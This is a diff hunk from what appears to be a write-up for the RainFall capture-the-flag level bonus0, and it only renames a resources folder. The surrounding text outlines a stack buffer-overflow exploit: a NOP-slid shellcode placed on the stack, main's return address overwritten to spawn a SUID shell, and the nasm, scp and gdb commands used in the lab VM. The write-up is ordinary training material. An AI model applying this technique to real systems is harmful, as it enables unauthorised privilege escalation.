@@ -52,8 +52,8 @@ Since the read buffer of p is on the stack, and is one page big, we can store a 
 So by stocking a NOP-slided shellcode on the stack and overwriting the return eip of main with an address to the NOP-slide, executing the shellcode, we get a SUID shell.
 
 We assemble our shellcode
-nasm ./ressources/shellcode.asm
-[Upload the resulting ./ressources/shellcode to the vm at /tmp] : cat ../level9/flag | clipboard ; scp -P 4242 ./ressources/shellcode bonus0@rainfall:/tmp
+nasm ./Resource/shellcode.asm
+[Upload the resulting ./Resource/shellcode to the vm at /tmp] : cat ../level9/flag | clipboard ; scp -P 4242 ./Resource/shellcode bonus0@rainfall:/tmp
 
 Now we figure out the address of the read buffer:
 bonus0@RainFall:~$ gdb --args ./bonus0 "" ""
